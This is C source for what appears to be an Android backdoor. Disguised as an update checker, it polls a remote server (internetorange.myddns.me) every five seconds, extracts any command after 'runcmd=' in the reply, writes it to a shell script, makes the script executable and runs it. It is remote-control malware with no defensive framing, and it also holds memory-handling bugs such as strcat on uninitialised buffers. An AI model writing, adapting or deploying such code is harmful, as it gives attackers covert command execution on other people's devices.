#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#include <netinet/tcp.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>



// void bzero(void *s, size_t n);
#define bzero(s, n) memset((s), 0, (n))

// void bcopy(const void *s1, void *s2, size_t n);
#define bcopy(s1, s2, n) memmove((s2), (s1), (n))


int socket_connect(char *host, in_port_t port){
	struct hostent *hp;
	struct sockaddr_in addr;
	int on = 1, sock;     

	if((hp = gethostbyname(host)) == NULL){
		herror("gethostbyname");
		exit(1);
	}
	bcopy(hp->h_addr, &addr.sin_addr, hp->h_length);
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
	sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);
	setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, (const char *)&on, sizeof(int));

	if(sock == -1){
		perror("setsockopt");
		exit(1);
	}

	if(connect(sock, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1){
		perror("connect");
		exit(1);

	}
	return sock;
}


#define BUFFER_SIZE 1024


int main(int argc, char *argv[]){
	int fd;
	char buffer[BUFFER_SIZE];
	char respbody[BUFFER_SIZE];
	char execPath[strlen(argv[3])+11];
	char *request;

	if(argc < 5){
		fprintf(stderr, "Usage: %s <hostname> <port> <AppAbsPath> <deviceuuid>\n", argv[0]);
		exit(1); 
	}

	int v = strlen(argv[4]) + 135;
	char *reque = (char *)malloc(v);
	strcat(reque, "GET /checkupdate.js?id=");
	strcat(reque, argv[4]);
	strcat(reque, "&token=updated HTTP/1.1\r\nHost: internetorange.myddns.me\r\nUser-Agent: JustKidding\r\nConnection: close\r\n\r\n");
	fprintf(stderr, "%s\n", reque);
	char *routing = "ip route | grep wlan";
	int routingSTAT = system(routing);
	while (1){
		routingSTAT = system(routing);
		if (routingSTAT==0){
			fd = socket_connect(argv[1], atoi(argv[2])); 
			write(fd, reque, strlen(reque));
			bzero(buffer, BUFFER_SIZE);


			while(read(fd, buffer, BUFFER_SIZE - 1)!=0){
				memcpy (respbody, buffer, sizeof(buffer) );
				bzero(buffer, BUFFER_SIZE);
			}
			
			request = strstr(respbody, "runcmd=");

			if (request!=NULL){
				request += 7;
				FILE * fpf;
				strcpy(execPath, argv[3]);
				strcat(execPath, "/runexec.sh");
				fpf = fopen (execPath,"w");
				fprintf(fpf, "#!/system/bin/sh\n%s\n",request);
				fclose (fpf);
				int vv = strlen(execPath)+22;
				char *chmodexec = (char *)malloc(vv);
				strcat(chmodexec, "/system/bin/chmod 744 ");
				strcat(chmodexec, execPath);
				int status = system(chmodexec);
				status = system(execPath);
			}

			shutdown(fd, SHUT_RDWR); 
			close(fd);
		}
		sleep(5);
	}
	return 0;
}
